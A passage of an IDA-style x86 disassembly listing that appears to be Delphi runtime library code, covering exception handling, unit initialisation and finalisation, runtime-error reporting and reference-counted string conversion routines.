arg_4		= dword	ptr  8

		xor	edx, edx
		mov	ecx, [esp+arg_4]
		mov	eax, [esp+arg_0]
		add	ecx, 5
		mov	fs:[edx], eax
		call	ecx
		retn	0Ch
sub_403418	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 10h

loc_403430:				; CODE XREF: CODE:00403530j
					; CODE:0040353Cj
		push	ebp
		mov	ebp, esp
		mov	edx, [ebp+8]
		mov	eax, [edx]
		cmp	eax, 0C0000092h
		jg	short loc_40346B
		jz	short loc_40349D
		cmp	eax, 0C000008Eh
		jg	short loc_40345D
		jz	short loc_4034A1
		sub	eax, 0C0000005h
		jz	short loc_4034AD
		sub	eax, 87h
		jz	short loc_403495
		dec	eax
		jz	short loc_4034A9
		jmp	short loc_4034BD
; ---------------------------------------------------------------------------

loc_40345D:				; CODE XREF: CODE:00403446j
		add	eax, 3FFFFF71h
		sub	eax, 2
		jb	short loc_40349D
		jz	short loc_403499
		jmp	short loc_4034BD
; ---------------------------------------------------------------------------

loc_40346B:				; CODE XREF: CODE:0040343Dj
		cmp	eax, 0C0000096h
		jg	short loc_403483
		jz	short loc_4034B1
		sub	eax, 0C0000093h
		jz	short loc_4034A9
		dec	eax
		jz	short loc_403491
		dec	eax
		jz	short loc_4034A5
		jmp	short loc_4034BD
; ---------------------------------------------------------------------------

loc_403483:				; CODE XREF: CODE:00403470j
		sub	eax, 0C00000FDh
		jz	short loc_4034B9
		sub	eax, 3Dh
		jz	short loc_4034B5
		jmp	short loc_4034BD
; ---------------------------------------------------------------------------

loc_403491:				; CODE XREF: CODE:0040347Cj
		mov	al, 0C8h
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_403495:				; CODE XREF: CODE:00403456j
		mov	al, 0C9h
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_403499:				; CODE XREF: CODE:00403467j
		mov	al, 0CDh
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_40349D:				; CODE XREF: CODE:0040343Fj
					; CODE:00403465j
		mov	al, 0CFh
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_4034A1:				; CODE XREF: CODE:00403448j
		mov	al, 0C8h
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_4034A5:				; CODE XREF: CODE:0040347Fj
		mov	al, 0D7h
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_4034A9:				; CODE XREF: CODE:00403459j
					; CODE:00403479j
		mov	al, 0CEh
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_4034AD:				; CODE XREF: CODE:0040344Fj
		mov	al, 0D8h
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_4034B1:				; CODE XREF: CODE:00403472j
		mov	al, 0DAh
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_4034B5:				; CODE XREF: CODE:0040348Dj
		mov	al, 0D9h
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_4034B9:				; CODE XREF: CODE:00403488j
		mov	al, 0CAh
		jmp	short loc_4034BF
; ---------------------------------------------------------------------------

loc_4034BD:				; CODE XREF: CODE:0040345Bj
					; CODE:00403469j ...
		mov	al, 0FFh

loc_4034BF:				; CODE XREF: CODE:00403493j
					; CODE:00403497j ...
		and	eax, 0FFh
		mov	edx, [edx+0Ch]
		call	sub_4025B0
; ---------------------------------------------------------------------------
		pop	ebp
		retn	4
; ---------------------------------------------------------------------------

loc_4034D0:				; DATA XREF: sub_403570+Do
		mov	eax, [esp+4]
		test	dword ptr [eax+4], 6
		jnz	loc_40356A
		cmp	ds:byte_41601C,	0
		ja	short loc_4034F9
		lea	eax, [esp+4]
		push	eax
		call	UnhandledExceptionFilter
		cmp	eax, 0
		jz	short loc_40356A

loc_4034F9:				; CODE XREF: CODE:004034E8j
		mov	eax, [esp+4]
		cld
		call	sub_402CB0
		mov	edx, [esp+8]
		push	0
		push	eax
		push	offset loc_403516
		push	edx
		call	ds:dword_417018

loc_403516:				; DATA XREF: CODE:0040350Ao
		mov	ebx, [esp+4]
		cmp	dword ptr [ebx], 0EEDFADEh
		mov	edx, [ebx+14h]
		mov	eax, [ebx+18h]
		jz	short loc_403545
		mov	edx, ds:dword_417010
		test	edx, edx
		jz	loc_403430
		mov	eax, ebx
		call	edx ; dword_417010
		test	eax, eax
		jz	loc_403430
		mov	edx, [ebx+0Ch]

loc_403545:				; CODE XREF: CODE:00403526j
		call	sub_402F9C
		mov	ecx, ds:dword_417004
		test	ecx, ecx
		jz	short loc_403556
		call	ecx ; dword_417004

loc_403556:				; CODE XREF: CODE:00403552j
		mov	ecx, [esp+4]
		mov	eax, 0D9h
		mov	edx, [ecx+14h]
		mov	[esp], edx
		jmp	sub_403988
; ---------------------------------------------------------------------------

loc_40356A:				; CODE XREF: CODE:004034DBj
					; CODE:004034F7j
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_403570	proc near		; CODE XREF: sub_403678+62p
		xor	edx, edx
		lea	eax, [ebp-0Ch]
		mov	ecx, fs:[edx]
		mov	fs:[edx], eax
		mov	[eax], ecx
		mov	dword ptr [eax+4], offset loc_4034D0
		mov	[eax+8], ebp
		mov	ds:dword_417634, eax
		retn
sub_403570	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_403590	proc near		; CODE XREF: sub_4038A4:loc_40392Ep
		xor	edx, edx
		mov	eax, ds:dword_417634
		test	eax, eax
		jz	short locret_4035B7
		mov	ecx, fs:[edx]
		cmp	eax, ecx
		jnz	short loc_4035AA
		mov	eax, [eax]
		mov	fs:[edx], eax
		retn
; ---------------------------------------------------------------------------

loc_4035A8:				; CODE XREF: sub_403590+21j
		mov	ecx, [ecx]

loc_4035AA:				; CODE XREF: sub_403590+10j
		cmp	ecx, 0FFFFFFFFh
		jz	short locret_4035B7
		cmp	[ecx], eax
		jnz	short loc_4035A8
		mov	eax, [eax]
		mov	[ecx], eax

locret_4035B7:				; CODE XREF: sub_403590+9j
					; sub_403590+1Dj
		retn
sub_403590	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4035B8	proc near		; CODE XREF: sub_4035B8+4Bp
					; sub_403618+4Bp ...
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	edi, offset dword_417630
		mov	eax, [edi+8]
		test	eax, eax
		jz	short loc_403612
		mov	ebx, [edi+0Ch]
		mov	esi, [eax+4]
		xor	edx, edx
		push	ebp
		push	offset loc_4035FE
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		test	ebx, ebx
		jle	short loc_4035F4

loc_4035E2:				; CODE XREF: sub_4035B8+3Aj
		dec	ebx
		mov	[edi+0Ch], ebx
		mov	eax, [esi+ebx*8+4]
		test	eax, eax
		jz	short loc_4035F0
		call	eax

loc_4035F0:				; CODE XREF: sub_4035B8+34j
		test	ebx, ebx
		jg	short loc_4035E2

loc_4035F4:				; CODE XREF: sub_4035B8+28j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_403612
; ---------------------------------------------------------------------------

loc_4035FE:				; DATA XREF: sub_4035B8+1Bo
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4035B8
		call	sub_403394
		call	sub_4033E8

loc_403612:				; CODE XREF: sub_4035B8+10j
					; sub_4035B8+44j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_4035B8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403618	proc near		; CODE XREF: sub_403678+BFp
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	eax, ds:dword_417638
		test	eax, eax
		jz	short loc_403672
		mov	esi, [eax]
		xor	ebx, ebx
		mov	edi, [eax+4]
		xor	edx, edx
		push	ebp
		push	offset loc_40365E
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		cmp	esi, ebx
		jle	short loc_403654

loc_403640:				; CODE XREF: sub_403618+3Aj
		mov	eax, [edi+ebx*8]
		inc	ebx
		mov	ds:dword_41763C, ebx
		test	eax, eax
		jz	short loc_403650
		call	eax

loc_403650:				; CODE XREF: sub_403618+34j
		cmp	esi, ebx
		jg	short loc_403640

loc_403654:				; CODE XREF: sub_403618+26j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_403672
; ---------------------------------------------------------------------------

loc_40365E:				; DATA XREF: sub_403618+19o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4035B8
		call	sub_403394
		call	sub_4033E8

loc_403672:				; CODE XREF: sub_403618+Dj
					; sub_403618+44j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_403618	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403678	proc near		; CODE XREF: sub_405094+40p

arg_0		= dword	ptr  4

		push	ecx
		push	esi
		push	edi
		mov	esi, offset dword_417630
		lea	edi, [ebp-3Ch]
		mov	ecx, 0Bh
		rep movsd
		pop	ds:dword_417650
		pop	ds:dword_41764C
		mov	ds:dword_417644, ebp
		mov	ds:dword_417648, ebx
		mov	ds:dword_417638, eax
		mov	ds:dword_417640, edx
		lea	ecx, [ebp-3Ch]
		mov	ds:dword_417630, ecx
		xor	ecx, ecx
		cmp	dword ptr [ebp+0Ch], 0
		jnz	short loc_4036C0
		mov	ecx, [eax]

loc_4036C0:				; CODE XREF: sub_403678+44j
		mov	ds:dword_41763C, ecx
		mov	eax, offset RaiseException
		mov	ds:dword_417014, eax
		mov	eax, offset RtlUnwind
		mov	ds:dword_417018, eax
		call	sub_403570
		mov	eax, [ebp+0Ch]
		inc	eax
		mov	ds:byte_417658,	al
		dec	eax
		pop	ecx
		mov	edx, [ecx]
		mov	ds:dword_417654, edx
		jz	short loc_4036FB
		cmp	al, 3
		jge	short loc_4036FB
		call	dword ptr [ecx+eax*4]

loc_4036FB:				; CODE XREF: sub_403678+7Aj
					; sub_403678+7Ej
		push	ecx
		mov	ecx, [esp+4+arg_0]
		test	ecx, ecx
		jz	short loc_40370C
		mov	eax, [ebp+0Ch]
		mov	edx, [ebp+10h]
		call	ecx

loc_40370C:				; CODE XREF: sub_403678+8Aj
		pop	ecx
		mov	eax, [ebp+0Ch]
		cmp	al, 3
		jl	short loc_403717
		call	dword ptr [ecx+eax*4]

loc_403717:				; CODE XREF: sub_403678+9Aj
		cmp	ds:dword_41702C, 0
		jnz	short loc_40372D
		mov	ds:byte_417034,	1
		fnstcw	ds:word_416018

loc_40372D:				; CODE XREF: sub_403678+A6j
		mov	eax, [ebp+0Ch]
		dec	eax
		jnz	sub_4038A4
		call	sub_403618
		retn	4
sub_403678	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403740	proc near		; CODE XREF: sub_41520C+1Fp
		push	ebx
		xor	ebx, ebx
		push	edi
		push	esi
		mov	edi, [eax+ebx]
		lea	esi, [eax+ebx+4]

loc_40374C:				; CODE XREF: sub_403740+1Fj
		mov	eax, [esi+4]
		mov	edx, [esi]
		mov	eax, [eax+ebx]
		add	edx, ebx
		call	sub_404D54
		add	esi, 8
		dec	edi
		jnz	short loc_40374C
		pop	esi
		pop	edi
		pop	ebx
		retn
sub_403740	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403768	proc near		; CODE XREF: sub_41520C+29p
		push	ebx
		xor	ebx, ebx
		push	edi
		push	esi
		mov	edi, [eax+ebx]
		lea	esi, [eax+ebx+4]

loc_403774:				; CODE XREF: sub_403768+1Ej
		mov	eax, [esi+4]
		mov	edx, [esi]
		mov	eax, [eax+ebx]
		add	eax, [esi+8]
		mov	[edx+ebx], eax
		add	esi, 0Ch
		dec	edi
		jnz	short loc_403774
		pop	esi
		pop	edi
		pop	ebx
		retn
sub_403768	endp


; =============== S U B	R O U T	I N E =======================================


sub_40378C	proc near		; CODE XREF: sub_4038A4+38p
		push	ebx
		push	esi
		push	edi
		mov	esi, offset Text ; "Runtime error     at 00000000"
		mov	cl, 10h
		mov	ebx, ds:dword_416000

loc_40379C:				; CODE XREF: sub_40378C+33j
		mov	eax, ebx
		mov	edi, 0Ah
		cdq
		idiv	edi
		add	dl, 30h
		xor	eax, eax
		mov	al, cl
		mov	[esi+eax], dl
		mov	eax, ebx
		mov	ebx, 0Ah
		cdq
		idiv	ebx
		mov	ebx, eax
		dec	ecx
		test	ebx, ebx
		jnz	short loc_40379C
		mov	cl, 1Ch
		mov	eax, ds:dword_416004

loc_4037C8:				; CODE XREF: sub_40378C+54j
		mov	edx, eax
		and	edx, 0Fh
		mov	dl, ds:byte_416080[edx]
		xor	ebx, ebx
		mov	bl, cl
		mov	[esi+ebx], dl
		shr	eax, 4
		dec	ecx
		test	eax, eax
		jnz	short loc_4037C8
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40378C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4037E8	proc near		; CODE XREF: sub_4038A4+9Ep
		xor	eax, eax
		xchg	eax, ds:dword_416000
		neg	eax
		sbb	eax, eax
		inc	eax
		mov	edi, offset dword_417630
		mov	ebx, [edi+18h]
		mov	ebp, [edi+14h]
		push	dword ptr [edi+1Ch]
		push	dword ptr [edi+20h]
		mov	esi, [edi]
		mov	ecx, 0Bh
		rep movsd
		pop	edi
		pop	esi
		leave
		retn	0Ch
sub_4037E8	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403818	proc near		; CODE XREF: sub_4038A4+3Dp

NumberOfBytesWritten= dword ptr	-4

		push	ecx
		cmp	ds:byte_417044,	0
		jz	short loc_403879
		cmp	ds:word_417218,	0D7B2h
		jnz	short loc_403841
		cmp	ds:dword_417220, 0
		jbe	short loc_403841
		mov	eax, offset dword_417214
		call	ds:dword_417230

loc_403841:				; CODE XREF: sub_403818+13j
					; sub_403818+1Cj
		push	0		; lpOverlapped
		lea	eax, [esp+8+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	1Eh		; nNumberOfBytesToWrite
		push	offset Text	; "Runtime error     at	00000000"
		push	0FFFFFFF5h	; nStdHandle
		call	GetStdHandle
		push	eax		; hFile
		call	WriteFile
		push	0		; lpOverlapped
		lea	eax, [esp+8+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	2		; nNumberOfBytesToWrite
		push	offset dword_4038A0 ; lpBuffer
		push	0FFFFFFF5h	; nStdHandle
		call	GetStdHandle
		push	eax		; hFile
		call	WriteFile
		pop	edx
		retn
; ---------------------------------------------------------------------------

loc_403879:				; CODE XREF: sub_403818+8j
		cmp	ds:byte_416024,	0
		jnz	short loc_403895
		push	0		; uType
		push	offset Caption	; "Error"
		push	offset Text	; "Runtime error     at	00000000"
		push	0		; hWnd
		call	MessageBoxA

loc_403895:				; CODE XREF: sub_403818+68j
		pop	edx
		retn
sub_403818	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 2
dword_4038A0	dd 0A0Dh		; DATA XREF: sub_403818+4Do

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_4038A4	proc near		; CODE XREF: sub_403678+B9j
					; sub_40397C+5p ...
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	ebx, offset dword_417630
		mov	esi, offset dword_416000
		mov	edi, offset dword_417040
		cmp	byte ptr [ebx+28h], 0
		jnz	short loc_4038D3
		cmp	dword ptr [edi], 0
		jz	short loc_4038D3

loc_4038C2:				; CODE XREF: sub_4038A4+2Dj
		mov	edx, [edi]
		mov	eax, edx
		xor	edx, edx
		mov	[edi], edx
		mov	ebp, eax
		call	ebp
		cmp	dword ptr [edi], 0
		jnz	short loc_4038C2

loc_4038D3:				; CODE XREF: sub_4038A4+17j
					; sub_4038A4+1Cj
		cmp	ds:dword_416004, 0
		jz	short loc_4038ED
		call	sub_40378C
		call	sub_403818
		xor	eax, eax
		mov	ds:dword_416004, eax

loc_4038ED:				; CODE XREF: sub_4038A4+36j
					; sub_4038A4+CEj
		cmp	byte ptr [ebx+28h], 2
		jnz	short loc_4038FD
		cmp	dword ptr [esi], 0
		jnz	short loc_4038FD
		xor	eax, eax
		mov	[ebx+0Ch], eax

loc_4038FD:				; CODE XREF: sub_4038A4+4Dj
					; sub_4038A4+52j
		call	sub_4035B8
		cmp	byte ptr [ebx+28h], 1
		jbe	short loc_40390D
		cmp	dword ptr [esi], 0
		jz	short loc_40392E

loc_40390D:				; CODE XREF: sub_4038A4+62j
		mov	eax, [ebx+10h]
		test	eax, eax
		jz	short loc_40392E
		call	sub_404CA0
		mov	edx, [ebx+10h]
		mov	eax, [edx+10h]
		cmp	eax, [edx+4]
		jz	short loc_40392E
		test	eax, eax
		jz	short loc_40392E
		push	eax		; hLibModule
		call	FreeLibrary

loc_40392E:				; CODE XREF: sub_4038A4+67j
					; sub_4038A4+6Ej ...
		call	sub_403590
		cmp	byte ptr [ebx+28h], 1
		jnz	short loc_40393C
		call	dword ptr [ebx+24h]

loc_40393C:				; CODE XREF: sub_4038A4+93j
		cmp	byte ptr [ebx+28h], 0
		jz	short loc_403947
		call	sub_4037E8

loc_403947:				; CODE XREF: sub_4038A4+9Cj
		cmp	dword ptr [ebx], 0
		jnz	short loc_403963
		cmp	ds:dword_417024, 0
		jz	short loc_40395B
		call	ds:dword_417024

loc_40395B:				; CODE XREF: sub_4038A4+AFj
		mov	eax, [esi]
		push	eax		; uExitCode
		call	ExitProcess
; ---------------------------------------------------------------------------

loc_403963:				; CODE XREF: sub_4038A4+A6j
		mov	eax, [ebx]
		push	esi
		mov	esi, eax
		mov	edi, ebx
		mov	ecx, 0Bh
		rep movsd
		pop	esi
		jmp	loc_4038ED
sub_4038A4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_40397C	proc near		; CODE XREF: sub_4025B0+6p
					; sub_403988+6j ...
		mov	ds:dword_416000, eax
		call	sub_4038A4
sub_40397C	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_403988	proc near		; CODE XREF: sub_40336C+9p
					; CODE:00403565j ...
		pop	ds:dword_416004
		jmp	sub_40397C
sub_403988	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403994	proc near		; CODE XREF: sub_403A84+23p
					; sub_403AF0+1Bp ...
		mov	edx, [eax]
		test	edx, edx
		jz	short locret_4039B6
		mov	dword ptr [eax], 0
		mov	ecx, [edx-8]
		dec	ecx
		jl	short locret_4039B6
		lock dec dword ptr [edx-8]
		jnz	short locret_4039B6
		push	eax
		lea	eax, [edx-8]
		call	sub_402540
		pop	eax

locret_4039B6:				; CODE XREF: sub_403994+4j
					; sub_403994+10j ...
		retn
sub_403994	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4039B8	proc near		; CODE XREF: sub_4040E8+56p
					; sub_405640+2AEp ...
		push	ebx
		push	esi
		mov	ebx, eax
		mov	esi, edx

loc_4039BE:				; CODE XREF: sub_4039B8+2Aj
		mov	edx, [ebx]
		test	edx, edx
		jz	short loc_4039DE
		mov	dword ptr [ebx], 0
		mov	ecx, [edx-8]
		dec	ecx
		jl	short loc_4039DE
		lock dec dword ptr [edx-8]
		jnz	short loc_4039DE
		lea	eax, [edx-8]
		call	sub_402540

loc_4039DE:				; CODE XREF: sub_4039B8+Aj
					; sub_4039B8+16j ...
		add	ebx, 4
		dec	esi
		jnz	short loc_4039BE
		pop	esi
		pop	ebx
		retn
sub_4039B8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4039E8	proc near		; CODE XREF: sub_403C2C+8j
					; sub_403C70+6j ...
		test	edx, edx
		jz	short loc_403A10
		mov	ecx, [edx-8]
		inc	ecx
		jg	short loc_403A0C
		push	eax
		push	edx
		mov	eax, [edx-4]
		call	sub_403A58
		mov	edx, eax
		pop	eax
		push	edx
		mov	ecx, [eax-4]
		call	sub_402664
		pop	edx
		pop	eax
		jmp	short loc_403A10
; ---------------------------------------------------------------------------

loc_403A0C:				; CODE XREF: sub_4039E8+8j
		lock inc dword ptr [edx-8]

loc_403A10:				; CODE XREF: sub_4039E8+2j
					; sub_4039E8+22j
		xchg	edx, [eax]
		test	edx, edx
		jz	short locret_403A2A
		mov	ecx, [edx-8]
		dec	ecx
		jl	short locret_403A2A
		lock dec dword ptr [edx-8]
		jnz	short locret_403A2A
		lea	eax, [edx-8]
		call	sub_402540

locret_403A2A:				; CODE XREF: sub_4039E8+2Cj
					; sub_4039E8+32j ...
		retn
sub_4039E8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403A2C	proc near		; CODE XREF: sub_40F0A4+14Dp
					; sub_40F0A4+305p ...
		test	edx, edx
		jz	short loc_403A3A
		mov	ecx, [edx-8]
		inc	ecx
		jle	short loc_403A3A
		lock inc dword ptr [edx-8]

loc_403A3A:				; CODE XREF: sub_403A2C+2j
					; sub_403A2C+8j
		xchg	edx, [eax]
		test	edx, edx
		jz	short locret_403A54
		mov	ecx, [edx-8]
		dec	ecx
		jl	short locret_403A54
		lock dec dword ptr [edx-8]
		jnz	short locret_403A54
		lea	eax, [edx-8]
		call	sub_402540

locret_403A54:				; CODE XREF: sub_403A2C+12j
					; sub_403A2C+18j ...
		retn
sub_403A2C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403A58	proc near		; CODE XREF: sub_4039E8+Fp
					; sub_403A84+Bp ...
		test	eax, eax
		jle	short loc_403A80
		push	eax
		add	eax, 0Ah
		and	eax, 0FFFFFFFEh
		push	eax
		call	sub_402520
		pop	edx
		mov	word ptr [edx+eax-2], 0
		add	eax, 8
		pop	edx
		mov	[eax-4], edx
		mov	dword ptr [eax-8], 1
		retn
; ---------------------------------------------------------------------------

loc_403A80:				; CODE XREF: sub_403A58+2j
		xor	eax, eax
		retn
sub_403A58	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403A84	proc near		; CODE XREF: sub_403AF0+4Ep
					; sub_403B7C+8p ...
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	esi, edx
		mov	edi, ecx
		mov	eax, edi
		call	sub_403A58
		mov	ecx, edi
		mov	edi, eax
		test	esi, esi
		jz	short loc_403AA5
		mov	edx, eax
		mov	eax, esi
		call	sub_402664

loc_403AA5:				; CODE XREF: sub_403A84+16j
		mov	eax, ebx
		call	sub_403994
		mov	[ebx], edi
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403A84	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __fastcall sub_403AB4(LPCWSTR lpWideCharStr, int cbMultiByte, int	cchWideChar)
sub_403AB4	proc near		; CODE XREF: sub_403AF0+3Bp
					; sub_403AF0+6Bp

cchWideChar	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	0		; lpUsedDefaultChar
		push	0		; lpDefaultChar
		push	edx		; cbMultiByte
		push	eax		; lpMultiByteStr
		mov	eax, [ebp+cchWideChar]
		push	eax		; cchWideChar
		push	ecx		; lpWideCharStr
		push	0		; dwFlags
		mov	eax, ds:CodePage
		push	eax		; CodePage
		call	WideCharToMultiByte
		pop	ebp
		retn	4
sub_403AB4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __fastcall sub_403AD4(LPCSTR lpMultiByteStr, int cchWideChar, int	cbMultiByte)
sub_403AD4	proc near		; CODE XREF: sub_404408+1Fp

cbMultiByte	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	edx		; cchWideChar
		push	eax		; lpWideCharStr
		mov	eax, [ebp+cbMultiByte]
		push	eax		; cbMultiByte
		push	ecx		; lpMultiByteStr
		push	0		; dwFlags
		mov	eax, ds:CodePage
		push	eax		; CodePage
		call	MultiByteToWideChar
		pop	ebp
		retn	4
sub_403AD4	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


; int __fastcall sub_403AF0(int	cchWideChar)
sub_403AF0	proc near		; CODE XREF: sub_403BBC:loc_403BEFj
					; CODE:loc_403C1Bj

lpWideCharStr	= dword	ptr -1014h
var_1010	= byte ptr -1010h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFF004h
		push	eax
		add	esp, 0FFFFFFFCh
		mov	esi, ecx
		mov	[esp+1014h+lpWideCharStr], edx
		mov	edi, eax
		test	esi, esi
		jg	short loc_403B12
		mov	eax, edi
		call	sub_403994
		jmp	short loc_403B71
; ---------------------------------------------------------------------------

loc_403B12:				; CODE XREF: sub_403AF0+17j
		lea	ebp, [esi+1]
		cmp	ebp, 7FFh
		jge	short loc_403B45
		push	esi		; cchWideChar
		lea	eax, [esp+1018h+var_1010]
		mov	ecx, [esp+1018h+lpWideCharStr] ; lpWideCharStr
		mov	edx, 0FFFh	; cbMultiByte
		call	sub_403AB4
		mov	ebx, eax
		test	ebx, ebx
		jl	short loc_403B45
		lea	edx, [esp+1014h+var_1010]
		mov	eax, edi
		mov	ecx, ebx
		call	sub_403A84
		jmp	short loc_403B71
; ---------------------------------------------------------------------------

loc_403B45:				; CODE XREF: sub_403AF0+2Bj
					; sub_403AF0+44j
		mov	ebx, ebp
		add	ebx, ebx
		mov	eax, edi
		mov	edx, ebx
		call	sub_403F0C
		push	esi		; cchWideChar
		mov	eax, [edi]
		mov	ecx, [esp+1018h+lpWideCharStr] ; lpWideCharStr
		mov	edx, ebx	; cbMultiByte
		call	sub_403AB4
		mov	ebx, eax
		test	ebx, ebx
		jge	short loc_403B68
		xor	ebx, ebx

loc_403B68:				; CODE XREF: sub_403AF0+74j
		mov	eax, edi
		mov	edx, ebx
		call	sub_403F0C

loc_403B71:				; CODE XREF: sub_403AF0+20j
					; sub_403AF0+53j
		add	esp, 1004h
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403AF0	endp


; =============== S U B	R O U T	I N E =======================================


sub_403B7C	proc near		; CODE XREF: sub_4116B8+59p
					; sub_41392C+8Dp ...
		push	edx
		mov	edx, esp
		mov	ecx, 1
		call	sub_403A84
		pop	edx
		retn
sub_403B7C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403B8C	proc near		; CODE XREF: sub_404D54+48p
					; sub_406284+F0p ...
		xor	ecx, ecx
		test	edx, edx
		jz	short loc_403BB3
		push	edx

loc_403B93:				; CODE XREF: sub_403B8C+1Dj
		cmp	cl, [edx]
		jz	short loc_403BAE
		cmp	cl, [edx+1]
		jz	short loc_403BAD
		cmp	cl, [edx+2]
		jz	short loc_403BAC
		cmp	cl, [edx+3]
		jz	short loc_403BAB
		add	edx, 4
		jmp	short loc_403B93
; ---------------------------------------------------------------------------

loc_403BAB:				; CODE XREF: sub_403B8C+18j
		inc	edx

loc_403BAC:				; CODE XREF: sub_403B8C+13j
		inc	edx

loc_403BAD:				; CODE XREF: sub_403B8C+Ej
		inc	edx

loc_403BAE:				; CODE XREF: sub_403B8C+9j
		mov	ecx, edx
		pop	edx
		sub	ecx, edx

loc_403BB3:				; CODE XREF: sub_403B8C+4j
		jmp	sub_403A84
sub_403B8C	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403BBC	proc near		; CODE XREF: sub_41557C+70p
					; DATA XREF: sub_412D4E:loc_412E80o
		xor	ecx, ecx
		test	edx, edx
		jz	short loc_403BEF
		push	edx

loc_403BC3:				; CODE XREF: sub_403BBC+21j
		cmp	cx, [edx]
		jz	short loc_403BE8
		cmp	cx, [edx+2]
		jz	short loc_403BE5
		cmp	cx, [edx+4]
		jz	short loc_403BE2
		cmp	cx, [edx+6]
		jz	short loc_403BDF
		add	edx, 8
		jmp	short loc_403BC3
; ---------------------------------------------------------------------------

loc_403BDF:				; CODE XREF: sub_403BBC+1Cj
		add	edx, 2

loc_403BE2:				; CODE XREF: sub_403BBC+16j
		add	edx, 2

loc_403BE5:				; CODE XREF: sub_403BBC+10j
		add	edx, 2

loc_403BE8:				; CODE XREF: sub_403BBC+Aj
		mov	ecx, edx
		pop	edx
		sub	ecx, edx
		shr	ecx, 1		; cchWideChar

loc_403BEF:				; CODE XREF: sub_403BBC+4j
		jmp	sub_403AF0
sub_403BBC	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403BF8	proc near		; CODE XREF: sub_404DAC+36p
					; sub_4066FC+C7p ...
		push	edi
		push	eax
		push	ecx
		mov	edi, edx
		xor	eax, eax
		repne scasb
		jnz	short loc_403C05
		not	ecx

loc_403C05:				; CODE XREF: sub_403BF8+9j
		pop	eax
		add	ecx, eax
		pop	eax
		pop	edi
		jmp	sub_403A84
sub_403BF8	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------

loc_403C10:				; DATA XREF: sub_412D4E:loc_412E87o
		xor	ecx, ecx
		test	edx, edx
		jz	short loc_403C1B
		mov	ecx, [edx-4]
